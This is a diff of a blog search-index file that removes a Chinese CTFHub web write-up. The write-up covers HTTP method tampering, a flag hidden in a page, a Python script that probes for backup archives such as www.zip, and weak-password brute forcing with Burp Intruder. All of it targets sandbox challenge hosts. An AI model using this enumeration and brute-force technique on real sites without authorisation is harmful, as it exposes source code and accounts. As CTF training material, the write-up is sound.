-<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
-<hr>
-<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
-<p>falg</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
-<hr>
-<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
-
-<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
-<hr>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
-<hr>
-<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
-<hr>
-<blockquote>
-<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
-<ul>
-<li>tar</li>
-<li>tar.gz</li>
-<li>zip</li>
-<li>rar</li>
-</ul>
-<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
-<ul>
-<li>web</li>
-<li>website</li>
-<li>backup</li>
-<li>back</li>
-<li>www</li>
-<li>wwwroot</li>
-<li>temp</li>
-</ul>
-</blockquote>
-<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
-
-<p>文件下载，用python脚本，requests</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
-
-<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
-<p>打开flag文件，发现没有flag</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
-<p>直接用</p>
-<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
-<p><strong>弱口令</strong></p>
-<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
-</blockquote>
-<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
-<p>开启burp代理</p>
-<p>登录信息随便填，抓到request请求如下</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
-
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
 ]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
       <tags>
-        <tag>笔记</tag>
-        <tag>CTF</tag>
-        <tag>ctf.show</tag>
+        <tag>Begin</tag>
       </tags>
   </entry>
   <entry>
@@ -2728,20 +2788,6 @@ over</p>
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>实战</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>敬请T期待</title>
-    <url>/2024/01/16/%E6%95%AC%E8%AF%B7T%E6%9C%9F%E5%BE%85/</url>
-    <content><![CDATA[<h1 id="HEXO"><a href="#HEXO" class="headerlink" title="HEXO"></a>HEXO</h1><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO!"></a>HELLO!</h2><blockquote>
-<p>敬请T期待</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>Begin</tag>
       </tags>
   </entry>
   <entry>
